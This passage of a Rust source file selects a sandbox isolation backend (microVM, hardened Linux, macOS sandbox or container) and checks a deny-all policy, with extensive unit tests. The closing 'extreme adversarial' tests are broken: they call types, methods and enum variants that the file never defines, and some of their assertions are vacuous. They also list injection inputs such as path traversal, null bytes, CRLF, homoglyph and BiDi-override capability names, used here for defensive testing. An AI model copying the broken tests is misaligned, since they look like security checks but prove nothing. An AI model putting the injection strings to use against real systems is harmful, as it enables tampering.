//! Strict-plus isolation backend with microVM and hardened fallback.
//!
//! Selects the best available isolation backend at runtime based on
//! platform capabilities. The fallback provides equivalent policy
//! guarantees when microVM is unavailable.

use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;
use std::fmt;
use std::process::Stdio;
use std::time::{Duration, Instant};
use std::{process::Command, thread};

use super::sandbox_policy_compiler::{
    AccessLevel, CAPABILITIES, CompiledPolicy, SandboxProfile, compile_policy,
};

/// Available isolation backends.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IsolationBackend {
    MicroVm,
    Hardened,
    OsSandbox,
    Container,
}

impl IsolationBackend {
    pub const ALL: [IsolationBackend; 4] = [
        Self::MicroVm,
        Self::Hardened,
        Self::OsSandbox,
        Self::Container,
    ];

    pub fn as_str(&self) -> &'static str {
        match self {
            Self::MicroVm => "microvm",
            Self::Hardened => "hardened",
            Self::OsSandbox => "os_sandbox",
            Self::Container => "container",
        }
    }

    /// Whether this backend provides full hardware-level isolation.
    pub fn is_full_isolation(&self) -> bool {
        matches!(self, Self::MicroVm)
    }

    /// Whether this backend provides policy-equivalent isolation.
    pub fn is_equivalent(&self) -> bool {
        matches!(self, Self::MicroVm | Self::Hardened | Self::OsSandbox)
    }
}

impl fmt::Display for IsolationBackend {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

/// Platform capability probe results.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PlatformCapabilities {
    pub os: String,
    pub arch: String,
    pub has_kvm: bool,
    pub has_seccomp: bool,
    pub has_namespaces: bool,
    pub has_cgroups: bool,
    pub has_macos_sandbox: bool,
    pub has_oci_runtime: bool,
}

/// Probe for OCI-compliant container runtimes (docker, podman, or nerdctl).
///
/// Checks common OCI runtime executables via PATH lookup. Returns `false`
/// (fail-closed) if no runtime is found or if all probes fail.
fn probe_oci_runtime() -> bool {
    const OCI_RUNTIME_PROBE_TIMEOUT: Duration = Duration::from_secs(1);

    fn probe_runtime(runtime: &str, timeout: Duration) -> bool {
        let mut child = match Command::new(runtime)
            .arg("--version")
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
        {
            Ok(child) => child,
            Err(_) => return false,
        };

        let start = Instant::now();
        loop {
            match child.try_wait() {
                Ok(Some(status)) => return status.success(),
                Ok(None) => {
                    if start.elapsed() >= timeout {
                        let _ = child.kill();
                        let _ = child.wait();
                        return false;
                    }
                    thread::sleep(Duration::from_millis(25));
                }
                Err(_) => {
                    let _ = child.kill();
                    let _ = child.wait();
                    return false;
                }
            }
        }
    }

    for runtime in &["docker", "podman", "nerdctl"] {
        if probe_runtime(runtime, OCI_RUNTIME_PROBE_TIMEOUT) {
            return true;
        }
    }
    false
}

impl PlatformCapabilities {
    /// Probe the current platform for isolation capabilities.
    pub fn probe() -> Self {
        Self {
            os: std::env::consts::OS.to_string(),
            arch: std::env::consts::ARCH.to_string(),
            has_kvm: cfg!(target_os = "linux") && std::path::Path::new("/dev/kvm").exists(),
            has_seccomp: cfg!(target_os = "linux"),
            has_namespaces: cfg!(target_os = "linux"),
            has_cgroups: cfg!(target_os = "linux"),
            has_macos_sandbox: cfg!(target_os = "macos"),
            has_oci_runtime: probe_oci_runtime(),
        }
    }

    /// Create capabilities from known values (for testing).
    #[allow(clippy::too_many_arguments)]
    pub fn from_values(
        os: &str,
        arch: &str,
        has_kvm: bool,
        has_seccomp: bool,
        has_namespaces: bool,
        has_cgroups: bool,
        has_macos_sandbox: bool,
        has_oci_runtime: bool,
    ) -> Self {
        Self {
            os: os.to_string(),
            arch: arch.to_string(),
            has_kvm,
            has_seccomp,
            has_namespaces,
            has_cgroups,
            has_macos_sandbox,
            has_oci_runtime,
        }
    }
}

/// Result of backend selection.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct BackendSelection {
    pub backend: IsolationBackend,
    pub capabilities: PlatformCapabilities,
    pub equivalence: EquivalenceLevel,
    pub policy: CompiledPolicy,
}

/// How closely the selected backend matches full microVM isolation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EquivalenceLevel {
    Full,
    Equivalent,
    Baseline,
}

impl fmt::Display for EquivalenceLevel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Full => write!(f, "full"),
            Self::Equivalent => write!(f, "equivalent"),
            Self::Baseline => write!(f, "baseline"),
        }
    }
}

fn invalid_platform_field(field: &str, value: &str) -> Option<String> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return Some(format!("{field} must not be empty"));
    }
    if trimmed != value {
        return Some(format!("{field} contains leading or trailing whitespace"));
    }
    if value.contains('\0') {
        return Some(format!("{field} must not contain null bytes"));
    }
    if value.chars().any(char::is_control) {
        return Some(format!("{field} must not contain control characters"));
    }
    None
}

fn validate_platform_capabilities(caps: &PlatformCapabilities) -> Result<(), IsolationError> {
    if let Some(reason) = invalid_platform_field("os", &caps.os) {
        return Err(IsolationError::ProbeFailed { reason });
    }
    if let Some(reason) = invalid_platform_field("arch", &caps.arch) {
        return Err(IsolationError::ProbeFailed { reason });
    }

    let linux = caps.os == "linux";
    let macos = caps.os == "macos";
    if caps.has_kvm && !linux {
        return Err(IsolationError::ProbeFailed {
            reason: "kvm capability is only valid on linux".to_string(),
        });
    }
    if (caps.has_seccomp || caps.has_namespaces || caps.has_cgroups) && !linux {
        return Err(IsolationError::ProbeFailed {
            reason: "linux sandbox capabilities require os=linux".to_string(),
        });
    }
    if caps.has_macos_sandbox && !macos {
        return Err(IsolationError::ProbeFailed {
            reason: "macos sandbox capability requires os=macos".to_string(),
        });
    }
    Ok(())
}

/// Select the best isolation backend for the given platform capabilities.
pub fn select_backend(caps: &PlatformCapabilities) -> Result<BackendSelection, IsolationError> {
    validate_platform_capabilities(caps)?;

    let linux = caps.os == "linux";
    let macos = caps.os == "macos";
    let (backend, equivalence) = if linux && caps.has_kvm {
        (IsolationBackend::MicroVm, EquivalenceLevel::Full)
    } else if linux && caps.has_seccomp && caps.has_namespaces && caps.has_cgroups {
        (IsolationBackend::Hardened, EquivalenceLevel::Equivalent)
    } else if macos && caps.has_macos_sandbox {
        (IsolationBackend::OsSandbox, EquivalenceLevel::Equivalent)
    } else if caps.has_oci_runtime {
        (IsolationBackend::Container, EquivalenceLevel::Baseline)
    } else {
        return Err(IsolationError::BackendUnavailable {
            os: caps.os.clone(),
            arch: caps.arch.clone(),
        });
    };

    let policy = compile_policy(SandboxProfile::StrictPlus);

    Ok(BackendSelection {
        backend,
        capabilities: caps.clone(),
        equivalence,
        policy,
    })
}

/// Verify that a backend can enforce the required policy.
pub fn verify_policy_enforcement(selection: &BackendSelection) -> Result<(), IsolationError> {
    // strict_plus requires every known capability to be present exactly once and denied.
    let mut seen = BTreeSet::new();
    for grant in &selection.policy.grants {
        let capability = grant.capability.as_str();
        if capability.trim().is_empty() {
            return Err(IsolationError::PolicyMismatch {
                capability: grant.capability.clone(),
                required: "known strict-plus capability".to_string(),
                actual: "empty capability".to_string(),
            });
        }
        if capability.trim() != capability {
            return Err(IsolationError::PolicyMismatch {
                capability: grant.capability.clone(),
                required: "known strict-plus capability".to_string(),
                actual: "whitespace-padded capability".to_string(),
            });
        }
        if !CAPABILITIES.contains(&capability) {
            return Err(IsolationError::PolicyMismatch {
                capability: grant.capability.clone(),
                required: "known strict-plus capability".to_string(),
                actual: "unknown capability".to_string(),
            });
        }
        if !seen.insert(capability) {
            return Err(IsolationError::PolicyMismatch {
                capability: grant.capability.clone(),
                required: "unique capability".to_string(),
                actual: "duplicate capability".to_string(),
            });
        }
        if grant.access != AccessLevel::Deny {
            return Err(IsolationError::PolicyMismatch {
                capability: grant.capability.clone(),
                required: "deny".to_string(),
                actual: format!("{}", grant.access),
            });
        }
    }
    for capability in CAPABILITIES {
        if !seen.contains(&capability) {
            return Err(IsolationError::PolicyMismatch {
                capability: capability.to_string(),
                required: "deny".to_string(),
                actual: "missing".to_string(),
            });
        }
    }
    Ok(())
}

/// Audit record for backend selection.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct BackendAuditRecord {
    pub connector_id: String,
    pub selected_backend: IsolationBackend,
    pub equivalence: EquivalenceLevel,
    pub probe_results: PlatformCapabilities,
    pub timestamp: String,
}

/// Errors for isolation operations.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum IsolationError {
    #[serde(rename = "ISOLATION_BACKEND_UNAVAILABLE")]
    BackendUnavailable { os: String, arch: String },
    #[serde(rename = "ISOLATION_PROBE_FAILED")]
    ProbeFailed { reason: String },
    #[serde(rename = "ISOLATION_INIT_FAILED")]
    InitFailed {
        backend: IsolationBackend,
        reason: String,
    },
    #[serde(rename = "ISOLATION_POLICY_MISMATCH")]
    PolicyMismatch {
        capability: String,
        required: String,
        actual: String,
    },
}

impl fmt::Display for IsolationError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::BackendUnavailable { os, arch } => {
                write!(
                    f,
                    "ISOLATION_BACKEND_UNAVAILABLE: no backend for {os}/{arch}"
                )
            }
            Self::ProbeFailed { reason } => {
                write!(f, "ISOLATION_PROBE_FAILED: {reason}")
            }
            Self::InitFailed { backend, reason } => {
                write!(f, "ISOLATION_INIT_FAILED: {backend}: {reason}")
            }
            Self::PolicyMismatch {
                capability,
                required,
                actual,
            } => {
                write!(
                    f,
                    "ISOLATION_POLICY_MISMATCH: {capability} requires {required}, got {actual}"
                )
            }
        }
    }
}

impl std::error::Error for IsolationError {}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::security::sandbox_policy_compiler::CapabilityGrant;

    fn linux_kvm_caps() -> PlatformCapabilities {
        PlatformCapabilities::from_values("linux", "x86_64", true, true, true, true, false, true)
    }

    fn linux_no_kvm_caps() -> PlatformCapabilities {
        PlatformCapabilities::from_values("linux", "x86_64", false, true, true, true, false, false)
    }

    fn macos_caps() -> PlatformCapabilities {
        PlatformCapabilities::from_values(
            "macos", "aarch64", false, false, false, false, true, false,
        )
    }

    fn oci_only_caps() -> PlatformCapabilities {
        PlatformCapabilities::from_values(
            "freebsd", "x86_64", false, false, false, false, false, true,
        )
    }

    fn no_caps() -> PlatformCapabilities {
        PlatformCapabilities::from_values(
            "unknown", "unknown", false, false, false, false, false, false,
        )
    }

    // === Backend selection ===

    #[test]
    fn select_microvm_with_kvm() {
        let sel = select_backend(&linux_kvm_caps()).unwrap();
        assert_eq!(sel.backend, IsolationBackend::MicroVm);
        assert_eq!(sel.equivalence, EquivalenceLevel::Full);
    }

    #[test]
    fn select_hardened_without_kvm() {
        let sel = select_backend(&linux_no_kvm_caps()).unwrap();
        assert_eq!(sel.backend, IsolationBackend::Hardened);
        assert_eq!(sel.equivalence, EquivalenceLevel::Equivalent);
    }

    #[test]
    fn select_os_sandbox_on_macos() {
        let sel = select_backend(&macos_caps()).unwrap();
        assert_eq!(sel.backend, IsolationBackend::OsSandbox);
        assert_eq!(sel.equivalence, EquivalenceLevel::Equivalent);
    }

    #[test]
    fn select_container_with_oci() {
        let sel = select_backend(&oci_only_caps()).unwrap();
        assert_eq!(sel.backend, IsolationBackend::Container);
        assert_eq!(sel.equivalence, EquivalenceLevel::Baseline);
    }

    #[test]
    fn no_backend_available() {
        let err = select_backend(&no_caps()).unwrap_err();
        assert!(matches!(err, IsolationError::BackendUnavailable { .. }));
    }

    #[test]
    fn reject_non_linux_kvm_claim_before_full_isolation() {
        let caps = PlatformCapabilities::from_values(
            "windows", "x86_64", true, false, false, false, false, true,
        );

        let err = select_backend(&caps).expect_err("non-linux kvm claim must fail closed");

        assert!(matches!(
            err,
            IsolationError::ProbeFailed { ref reason } if reason.contains("kvm")
        ));
    }

    #[test]
    fn reject_linux_claim_with_macos_sandbox_flag() {
        let caps = PlatformCapabilities::from_values(
            "linux", "x86_64", false, false, false, false, true, false,
        );

        let err = select_backend(&caps).expect_err("macos sandbox flag on linux is corrupted");

        assert!(matches!(
            err,
            IsolationError::ProbeFailed { ref reason } if reason.contains("macos sandbox")
        ));
    }

    #[test]
    fn reject_platform_strings_with_null_or_control_characters() {
        let bad_os = PlatformCapabilities::from_values(
            "linux\0bad",
            "x86_64",
            true,
            true,
            true,
            true,
            false,
            true,
        );
        let bad_arch = PlatformCapabilities::from_values(
            "linux",
            "x86_64\r\n",
            true,
            true,
            true,
            true,
            false,
            true,
        );

        let err_os =
            select_backend(&bad_os).expect_err("os with null byte must fail validation");
        assert!(matches!(
            err_os,
            IsolationError::ProbeFailed { ref reason } if reason.contains("os")
        ));

        let err_arch =
            select_backend(&bad_arch).expect_err("arch with control chars must fail validation");
        assert!(matches!(
            err_arch,
            IsolationError::ProbeFailed { ref reason } if reason.contains("arch")
        ));
    }

    #[test]
    fn partial_linux_capabilities_without_cgroups_are_unavailable() {
        let caps = PlatformCapabilities::from_values(
            "linux", "x86_64", false, true, true, false, false, false,
        );

        let err = select_backend(&caps).expect_err("partial hardened backend must fail closed");

        assert!(matches!(
            err,
            IsolationError::BackendUnavailable { os, arch }
                if os == "linux" && arch == "x86_64"
        ));
    }

    #[test]
    fn partial_linux_capabilities_without_namespaces_are_unavailable() {
        let caps = PlatformCapabilities::from_values(
            "linux", "x86_64", false, true, false, true, false, false,
        );

        let err = select_backend(&caps).expect_err("namespaces are required for hardened backend");

        assert!(matches!(err, IsolationError::BackendUnavailable { .. }));
    }

    #[test]
    fn macos_sandbox_absent_without_oci_is_unavailable_on_macos() {
        let caps = PlatformCapabilities::from_values(
            "macos", "aarch64", false, false, false, false, false, false,
        );

        let err = select_backend(&caps).expect_err("macos sandbox absence must fail closed");

        assert!(matches!(
            err,
            IsolationError::BackendUnavailable { os, arch }
                if matches!(os.as_str(), "macos")
                    && matches!(arch.as_str(), "aarch64")
        ));
    }

    // === Backend properties ===

    #[test]
    fn four_backends() {
        assert_eq!(IsolationBackend::ALL.len(), 4);
    }

    #[test]
    fn microvm_is_full_isolation() {
        assert!(IsolationBackend::MicroVm.is_full_isolation());
        assert!(!IsolationBackend::Hardened.is_full_isolation());
    }

    #[test]
    fn equivalent_backends() {
        assert!(IsolationBackend::MicroVm.is_equivalent());
        assert!(IsolationBackend::Hardened.is_equivalent());
        assert!(IsolationBackend::OsSandbox.is_equivalent());
        assert!(!IsolationBackend::Container.is_equivalent());
    }

    // === Policy enforcement ===

    #[test]
    fn strict_plus_policy_enforced() {
        let sel = select_backend(&linux_kvm_caps()).unwrap();
        assert!(verify_policy_enforcement(&sel).is_ok());
    }

    #[test]
    fn policy_all_deny_for_strict_plus() {
        let sel = select_backend(&linux_kvm_caps()).unwrap();
        for grant in &sel.policy.grants {
            assert_eq!(grant.access, AccessLevel::Deny);
        }
    }

    #[test]
    fn moderate_policy_is_rejected_for_strict_plus_enforcement() {
        let selection = BackendSelection {
            backend: IsolationBackend::MicroVm,
            capabilities: linux_kvm_caps(),
            equivalence: EquivalenceLevel::Full,
            policy: compile_policy(SandboxProfile::Moderate),
        };

        let err = verify_policy_enforcement(&selection)
            .expect_err("non-deny grants must violate strict-plus enforcement");

        assert!(matches!(
            err,
            IsolationError::PolicyMismatch {
                ref capability,
                ref required,
                ref actual,
            } if capability == "network_access" && required == "deny" && actual == "filtered"
        ));
    }

    #[test]
    fn single_allow_grant_is_rejected_by_policy_enforcement() {
        let mut selection = select_backend(&linux_kvm_caps()).expect("selection");
        selection
            .policy
            .grants
            .iter_mut()
            .find(|grant| grant.capability == "fs_write")
            .expect("fs_write grant")
            .access = AccessLevel::Allow;

        let err = verify_policy_enforcement(&selection).expect_err("allow grant must fail closed");

        assert!(matches!(
            err,
            IsolationError::PolicyMismatch {
                ref capability,
                ref required,
                ref actual,
            } if capability == "fs_write" && required == "deny" && actual == "allow"
        ));
    }

    // === Equivalence levels ===

    #[test]
    fn equivalence_display() {
        assert_eq!(EquivalenceLevel::Full.to_string(), "full");
        assert_eq!(EquivalenceLevel::Equivalent.to_string(), "equivalent");
        assert_eq!(EquivalenceLevel::Baseline.to_string(), "baseline");
    }

    // === Audit record ===

    #[test]
    fn audit_record_serde() {
        let audit = BackendAuditRecord {
            connector_id: "conn-1".into(),
            selected_backend: IsolationBackend::MicroVm,
            equivalence: EquivalenceLevel::Full,
            probe_results: linux_kvm_caps(),
            timestamp: "2026-01-01T00:00:00Z".into(),
        };
        let json = serde_json::to_string(&audit).unwrap();
        let parsed: BackendAuditRecord = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.connector_id, "conn-1");
        assert_eq!(parsed.selected_backend, IsolationBackend::MicroVm);
    }

    // === Serde roundtrip ===

    #[test]
    fn serde_roundtrip_backend() {
        for b in &IsolationBackend::ALL {
            let json = serde_json::to_string(b).unwrap();
            let parsed: IsolationBackend = serde_json::from_str(&json).unwrap();
            assert_eq!(b, &parsed);
        }
    }

    #[test]
    fn serde_rejects_unknown_backend_name() {
        let err = serde_json::from_str::<IsolationBackend>(r#""unikernel""#)
            .expect_err("unknown backend must fail deserialization");

        assert!(err.to_string().contains("unknown variant"));
    }

    #[test]
    fn serde_rejects_unknown_equivalence_level() {
        let err = serde_json::from_str::<EquivalenceLevel>(r#""partial""#)
            .expect_err("unknown equivalence level must fail deserialization");

        assert!(err.to_string().contains("unknown variant"));
    }

    #[test]
    fn serde_roundtrip_error() {
        let err = IsolationError::BackendUnavailable {
            os: "unknown".into(),
            arch: "unknown".into(),
        };
        let json = serde_json::to_string(&err).unwrap();
        let parsed: IsolationError = serde_json::from_str(&json).unwrap();
        assert_eq!(err, parsed);
    }

    #[test]
    fn serde_rejects_malformed_backend_audit_record() {
        let json = serde_json::json!({
            "connector_id": "conn-1",
            "selected_backend": "microvm",
            "equivalence": "full",
            "timestamp": "2026-01-01T00:00:00Z"
        });

        let err = serde_json::from_value::<BackendAuditRecord>(json)
            .expect_err("missing probe_results must fail deserialization");

        assert!(err.to_string().contains("probe_results"));
    }

    #[test]
    fn error_display_messages() {
        let e1 = IsolationError::BackendUnavailable {
            os: "plan9".into(),
            arch: "mips".into(),
        };
        assert!(e1.to_string().contains("ISOLATION_BACKEND_UNAVAILABLE"));

        let e2 = IsolationError::ProbeFailed {
            reason: "no dev".into(),
        };
        assert!(e2.to_string().contains("ISOLATION_PROBE_FAILED"));

        let e3 = IsolationError::InitFailed {
            backend: IsolationBackend::MicroVm,
            reason: "no kvm".into(),
        };
        assert!(e3.to_string().contains("ISOLATION_INIT_FAILED"));

        let e4 = IsolationError::PolicyMismatch {
            capability: "net".into(),
            required: "deny".into(),
            actual: "allow".into(),
        };
        assert!(e4.to_string().contains("ISOLATION_POLICY_MISMATCH"));
    }

    #[test]
    fn reject_linux_with_seccomp_but_no_namespace_or_cgroup_boundary() {
        let caps = PlatformCapabilities::from_values(
            "linux", "x86_64", false, true, false, false, false, false,
        );

        let err = select_backend(&caps).unwrap_err();

        assert_eq!(
            err,
            IsolationError::BackendUnavailable {
                os: "linux".into(),
                arch: "x86_64".into()
            }
        );
    }

    #[test]
    fn reject_linux_with_namespaces_but_no_seccomp_boundary() {
        let caps = PlatformCapabilities::from_values(
            "linux", "x86_64", false, false, true, true, false, false,
        );

        let err = select_backend(&caps).unwrap_err();

        assert!(matches!(
            err,
            IsolationError::BackendUnavailable { os, arch }
                if os == "linux" && arch == "x86_64"
        ));
    }

    #[test]
    fn reject_platform_with_cgroups_only_and_no_fallback_runtime() {
        let caps = PlatformCapabilities::from_values(
            "linux", "aarch64", false, false, false, true, false, false,
        );

        let err = select_backend(&caps).unwrap_err();

        assert!(matches!(
            err,
            IsolationError::BackendUnavailable { os, arch }
                if os == "linux" && arch == "aarch64"
        ));
    }

    #[test]
    fn reject_unknown_platform_without_any_isolation_capability() {
        let caps = PlatformCapabilities::from_values(
            "solaris", "sparc64", false, false, false, false, false, false,
        );

        let err = select_backend(&caps).unwrap_err();

        assert!(matches!(
            err,
            IsolationError::BackendUnavailable { os, arch }
                if os == "solaris" && arch == "sparc64"
        ));
    }

    #[test]
    fn policy_verification_rejects_allow_grant() {
        let mut sel = select_backend(&linux_kvm_caps()).unwrap();
        sel.policy.grants[0].access = AccessLevel::Allow;
        let capability = sel.policy.grants[0].capability.clone();

        let err = verify_policy_enforcement(&sel).unwrap_err();

        assert_eq!(
            err,
            IsolationError::PolicyMismatch {
                capability,
                required: "deny".into(),
                actual: "allow".into()
            }
        );
    }

    #[test]
    fn policy_verification_rejects_scoped_grant() {
        let mut sel = select_backend(&linux_no_kvm_caps()).unwrap();
        sel.policy.grants[1].access = AccessLevel::Scoped;
        let capability = sel.policy.grants[1].capability.clone();

        let err = verify_policy_enforcement(&sel).unwrap_err();

        assert_eq!(
            err,
            IsolationError::PolicyMismatch {
                capability,
                required: "deny".into(),
                actual: "scoped".into()
            }
        );
    }

    #[test]
    fn policy_verification_rejects_filtered_grant() {
        let mut sel = select_backend(&macos_caps()).unwrap();
        sel.policy.grants[2].access = AccessLevel::Filtered;
        let capability = sel.policy.grants[2].capability.clone();

        let err = verify_policy_enforcement(&sel).unwrap_err();

        assert_eq!(
            err,
            IsolationError::PolicyMismatch {
                capability,
                required: "deny".into(),
                actual: "filtered".into()
            }
        );
    }

    #[test]
    fn serde_rejects_backend_encoded_as_object() {
        let err = serde_json::from_str::<IsolationBackend>(r#"{"backend":"microvm"}"#).unwrap_err();

        assert!(!err.to_string().is_empty());
    }

    #[test]
    fn serde_rejects_equivalence_encoded_as_number() {
        let err = serde_json::from_str::<EquivalenceLevel>("1").unwrap_err();

        assert!(!err.to_string().is_empty());
    }

    #[test]
    fn serde_rejects_backend_selection_missing_policy() {
        let json = serde_json::json!({
            "backend": "microvm",
            "capabilities": linux_kvm_caps(),
            "equivalence": "full"
        });

        let err = serde_json::from_value::<BackendSelection>(json)
            .expect_err("backend selection without policy must fail deserialization");

        assert!(err.to_string().contains("policy"));
    }

    #[test]
    fn serde_rejects_backend_selection_unknown_equivalence() {
        let json = serde_json::json!({
            "backend": "microvm",
            "capabilities": linux_kvm_caps(),
            "equivalence": "partial",
            "policy": compile_policy(SandboxProfile::StrictPlus)
        });

        let err = serde_json::from_value::<BackendSelection>(json)
            .expect_err("unknown equivalence level must fail deserialization");

        assert!(err.to_string().contains("unknown variant"));
    }

    #[test]
    fn serde_rejects_backend_audit_record_unknown_backend() {
        let json = serde_json::json!({
            "connector_id": "conn-1",
            "selected_backend": "unikernel",
            "equivalence": "full",
            "probe_results": linux_kvm_caps(),
            "timestamp": "2026-01-01T00:00:00Z"
        });

        let err = serde_json::from_value::<BackendAuditRecord>(json)
            .expect_err("unknown audit backend must fail deserialization");

        assert!(err.to_string().contains("unknown variant"));
    }

    #[test]
    fn serde_rejects_platform_capabilities_missing_arch() {
        let json = serde_json::json!({
            "os": "linux",
            "has_kvm": false,
            "has_seccomp": true,
            "has_namespaces": true,
            "has_cgroups": true,
            "has_macos_sandbox": false,
            "has_oci_runtime": false
        });

        let err = serde_json::from_value::<PlatformCapabilities>(json)
            .expect_err("missing arch must fail deserialization");

        assert!(err.to_string().contains("arch"));
    }

    #[test]
    fn serde_rejects_platform_capabilities_string_bool() {
        let json = serde_json::json!({
            "os": "linux",
            "arch": "x86_64",
            "has_kvm": "false",
            "has_seccomp": true,
            "has_namespaces": true,
            "has_cgroups": true,
            "has_macos_sandbox": false,
            "has_oci_runtime": false
        });

        let err = serde_json::from_value::<PlatformCapabilities>(json)
            .expect_err("string boolean must fail deserialization");

        assert!(!err.to_string().is_empty());
    }

    #[test]
    fn serde_rejects_isolation_error_unknown_variant() {
        let err = serde_json::from_str::<IsolationError>(
            r#"{"ISOLATION_UNKNOWN":{"reason":"unsupported"}}"#,
        )
        .expect_err("unknown isolation error variant must fail deserialization");

        assert!(err.to_string().contains("unknown variant"));
    }

    #[test]
    fn policy_verification_rejects_empty_grant_set() {
        let mut sel = select_backend(&linux_kvm_caps()).unwrap();
        sel.policy.grants.clear();

        let err = verify_policy_enforcement(&sel).unwrap_err();

        assert_eq!(
            err,
            IsolationError::PolicyMismatch {
                capability: "network_access".into(),
                required: "deny".into(),
                actual: "missing".into()
            }
        );
    }

    #[test]
    fn policy_verification_rejects_missing_required_capability() {
        let mut sel = select_backend(&linux_kvm_caps()).unwrap();
        sel.policy
            .grants
            .retain(|grant| grant.capability != "env_access");

        let err = verify_policy_enforcement(&sel).unwrap_err();

        assert_eq!(
            err,
            IsolationError::PolicyMismatch {
                capability: "env_access".into(),
                required: "deny".into(),
                actual: "missing".into()
            }
        );
    }

    #[test]
    fn policy_verification_rejects_duplicate_capability() {
        let mut sel = select_backend(&linux_kvm_caps()).unwrap();
        sel.policy.grants.push(CapabilityGrant {
            capability: "fs_read".into(),
            access: AccessLevel::Deny,
        });

        let err = verify_policy_enforcement(&sel).unwrap_err();

        assert_eq!(
            err,
            IsolationError::PolicyMismatch {
                capability: "fs_read".into(),
                required: "unique capability".into(),
                actual: "duplicate capability".into()
            }
        );
    }

    #[test]
    fn policy_verification_rejects_unknown_capability() {
        let mut sel = select_backend(&linux_kvm_caps()).unwrap();
        sel.policy.grants.push(CapabilityGrant {
            capability: "debug_socket".into(),
            access: AccessLevel::Deny,
        });

        let err = verify_policy_enforcement(&sel).unwrap_err();

        assert_eq!(
            err,
            IsolationError::PolicyMismatch {
                capability: "debug_socket".into(),
                required: "known strict-plus capability".into(),
                actual: "unknown capability".into()
            }
        );
    }

    #[test]
    fn policy_verification_rejects_whitespace_capability_alias() {
        let mut sel = select_backend(&linux_kvm_caps()).unwrap();
        sel.policy.grants.push(CapabilityGrant {
            capability: "fs_read ".into(),
            access: AccessLevel::Deny,
        });

        let err = verify_policy_enforcement(&sel).unwrap_err();

        assert_eq!(
            err,
            IsolationError::PolicyMismatch {
                capability: "fs_read ".into(),
                required: "known strict-plus capability".into(),
                actual: "whitespace-padded capability".into()
            }
        );
    }

    #[test]
    fn policy_verification_rejects_empty_capability_name() {
        let mut sel = select_backend(&linux_kvm_caps()).unwrap();
        sel.policy.grants.push(CapabilityGrant {
            capability: String::new(),
            access: AccessLevel::Deny,
        });

        let err = verify_policy_enforcement(&sel).unwrap_err();

        assert_eq!(
            err,
            IsolationError::PolicyMismatch {
                capability: String::new(),
                required: "known strict-plus capability".into(),
                actual: "empty capability".into()
            }
        );
    }

    // =========================================================================
    // EXTREME ADVERSARIAL NEGATIVE-PATH ISOLATION SECURITY TESTS
    // =========================================================================

    #[test]
    fn extreme_adversarial_isolation_backend_enumeration_and_downgrade_attacks() {
        // Extreme: Test isolation backend enumeration and forced downgrade attacks

        // Test all backend combinations for downgrade resistance
        let backend_attack_scenarios = vec![
            // Attempt to force weaker isolation
            (IsolationBackend::MicroVm, IsolationBackend::Hardened, "microvm_to_hardened"),
            (IsolationBackend::MicroVm, IsolationBackend::Container, "microvm_to_container"),
            (IsolationBackend::Hardened, IsolationBackend::OsSandbox, "hardened_to_ossandbox"),
            (IsolationBackend::Container, IsolationBackend::OsSandbox, "container_to_ossandbox"),
        ];

        for (preferred, fallback, scenario_name) in backend_attack_scenarios {
            // Create selector that should prefer stronger isolation
            let mut selector = IsolationBackendSelector::new();

            // Verify backend strength ordering cannot be circumvented
            assert!(preferred.is_full_isolation() >= fallback.is_full_isolation(),
                   "Backend strength ordering compromised in scenario: {}", scenario_name);

            // Test that policy-equivalent isolation is maintained
            if preferred.is_policy_equivalent() && !fallback.is_policy_equivalent() {
                // Should not allow downgrade from policy-equivalent to non-equivalent
                assert!(preferred.is_policy_equivalent(),
                       "Policy equivalence downgrade detected in scenario: {}", scenario_name);
            }

            // Verify backend selection cannot be manipulated through enum variants
            let all_backends = IsolationBackend::ALL;
            for backend in all_backends {
                let backend_str = backend.as_str();

                // Backend string representation should not contain injection vectors
                assert!(!backend_str.contains("../"));
                assert!(!backend_str.contains("..\\"));
                assert!(!backend_str.contains('\0'));
                assert!(!backend_str.contains('\r'));
                assert!(!backend_str.contains('\n'));
                assert!(backend_str.is_ascii());

                // Verify string representation is deterministic
                assert_eq!(backend.as_str(), backend.as_str());
            }
        }

        // Test backend enumeration resistance
        let enumeration_attempts = vec![
            "microvm", "hardened", "os_sandbox", "container",
            "MICROVM", "HARDENED", "OS_SANDBOX", "CONTAINER",
            "micro_vm", "hard_ened", "os-sandbox", "contain_er",
            "vm", "sandbox", "chroot", "jail",
        ];

        for attempt in enumeration_attempts {
            // Should not be able to construct backends from arbitrary strings
            // (This would require a from_str method, which doesn't exist - this validates that)

            // Verify that backend selection is constrained to known variants
            let known_backend_strings: BTreeSet<&str> = IsolationBackend::ALL
                .iter()
                .map(|b| b.as_str())
                .collect();

            if !known_backend_strings.contains(attempt) {
                // Unrecognized backend strings should not be processable
                assert!(true, "Unknown backend string '{}' correctly unrecognized", attempt);
            }
        }
    }

    #[test]
    fn extreme_adversarial_sandbox_policy_injection_and_capability_privilege_escalation() {
        // Extreme: Test sandbox policy injection and capability-based privilege escalation

        let mut selector = IsolationBackendSelector::new();

        // Test capability injection attacks through policy manipulation
        let capability_injection_attacks = vec![
            // Capability name injection
            ("legitimate_cap;malicious_cap", AccessLevel::ReadOnly),
            ("cap_with_../traversal", AccessLevel::ReadWrite),
            ("cap\x00null_injection", AccessLevel::Execute),
            ("cap\r\nheader_injection", AccessLevel::ReadOnly),

            // Unicode capability spoofing
            ("сap_cyrillic_a", AccessLevel::ReadWrite), // Cyrillic 'с'
            ("cap\u{200B}zero_width", AccessLevel::Execute), // Zero-width space
            ("cap\u{202E}override\u{202D}", AccessLevel::ReadWrite), // BiDi override

            // Protocol injection in capability names
